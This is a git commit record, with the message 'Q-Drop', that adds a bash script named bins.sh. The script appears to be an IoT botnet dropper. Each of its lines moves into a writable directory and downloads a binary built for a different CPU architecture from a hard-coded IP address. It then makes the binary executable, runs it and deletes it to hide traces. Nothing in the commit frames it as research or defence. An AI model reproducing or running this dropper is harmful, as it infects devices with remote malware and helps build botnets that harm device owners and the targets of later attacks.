1cea2dc332c7109cc8177e4d7aa1c36624695a06
whoAmI-cslim <clyde.hunter1984@gmail.com>
2020-01-20 16:19:31 -0500

    Q-Drop

---
+++ bins.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://142.11.244.135/nig4; chmod +x nig4; ./nig4; rm -rf nig4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://142.11.244.135/nig4t; chmod +x nig4t; ./nig4t; rm -rf nig4t
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://142.11.244.135/nig5; chmod +x nig5; ./nig5; rm -rf nig5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://142.11.244.135/nig6; chmod +x nig6; ./nig6; rm -rf nig6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://142.11.244.135/nigmips; chmod +x nigmips; ./nigmips; rm -rf nigmips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://142.11.244.135/nigmpsl; chmod +x nigmpsl; ./nigmpsl; rm -rf nigmpsl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://142.11.244.135/nig.x86; chmod +x nig.x86; ./nig.x86; rm -rf nig.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://142.11.244.135/nig7; chmod +x nig7; ./nig7; rm -rf nig7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://142.11.244.135/nig.mips64; chmod +x nig.mips64; ./nig.mips64; rm -rf nig.mips64
